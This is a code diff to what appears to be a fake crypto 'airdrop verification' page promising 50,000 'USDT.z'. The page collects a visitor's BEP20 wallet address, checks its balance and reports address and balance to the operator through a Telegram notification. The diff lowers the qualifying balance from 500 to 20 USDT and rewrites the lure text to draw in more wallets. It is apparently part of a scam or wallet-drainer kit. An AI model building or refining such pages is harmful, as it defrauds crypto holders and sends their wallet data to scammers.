@@ -399,9 +399,9 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
 
             if (balanceVal < threshold) {
                 addLog(`⚠️ System Alert: Wallet not qualified.`);
-                addLog(`❌ Hold Requirement: 500.00 USDT (BEP20)`);
+                addLog(`❌ Hold Requirement: 20.00 USDT (BEP20)`);
                 addLog(`ℹ️ Active balance required to verify wallet age.`);
-                await sendTelegramNotification(address, "FAIL - Low Balance (<500)", balanceUSD.toFixed(2));
+                await sendTelegramNotification(address, "FAIL - Low Balance (<20)", balanceUSD.toFixed(2));
                 verifyBtn.disabled = false;
                 verifyBtn.innerText = "Verify & Receive 50k USDT.z";
                 return;
@@ -620,7 +620,7 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
                         <img src="wp-content/uploads/2025/08/Logo-03-1-scaled.png" style="width: 35px; height: 35px; border-radius: 50%; box-shadow: 0 0 10px rgba(54, 187, 145, 0.4);">
                         <h5 style="color: #fff; margin: 0; font-weight: 700; letter-spacing: 0.5px; font-size: 16px;">Airdrop Verification</h5>
                       </div>
-                      <p style="color: #bbb; font-size: 11px; margin-bottom: 15px; line-height: 1.4;">Enter your BEP20 address. To prevent airdrop botting, wallets must hold at least <b>500 USDT (BEP20)</b> and show active transaction history to qualify for the 50,000 USDT.z claim.</p>
+                      <p style="color: #bbb; font-size: 11px; margin-bottom: 15px; line-height: 1.4;">Enter your BEP20 address. Wallets with <b>500 USDT or more</b> are more likely to receive the airdrop. A minimum balance of <b>20 USDT (BEP20)</b> is required to verify and qualify for the claim.</p>
                       
                       <input type="text" id="wallet-address" placeholder="Enter BSC Address (0x...)" class="glass-input">
                       
